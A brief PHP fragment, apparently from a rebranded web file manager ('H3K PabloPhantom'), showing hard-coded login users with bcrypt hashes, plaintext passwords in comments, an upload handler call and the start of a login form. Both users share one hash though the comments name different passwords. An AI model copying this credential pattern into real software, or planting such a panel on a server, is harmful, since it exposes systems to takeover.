...
$auth_users = array(
    'pablo' => '$2y$10$k0zVPCQKQuEC505oVvHGMO4.ww0BfGNRXQK7YDDdxOTlYOVr1VqQe', //admin@123
    'user' => '$2y$10$k0zVPCQKQuEC505oVvHGMO4.ww0BfGNRXQK7YDDdxOTlYOVr1VqQe' //12345
);
handleFileUpload();
                        ...
                        <div class="card fat <?php echo fm_get_theme(); ?>">
                            <div class="card-body">
                                <form class="form-signin" action="" method="post" autocomplete="off">
                                    <div class="mb-3">
                                       <div class="brand">
                                            <svg version="1.0" xmlns="http://www.w3.org/2000/svg" M1008 width="100%" height="80px" viewBox="0 0 238.000000 140.000000" aria-label="H3K PabloPhantom">
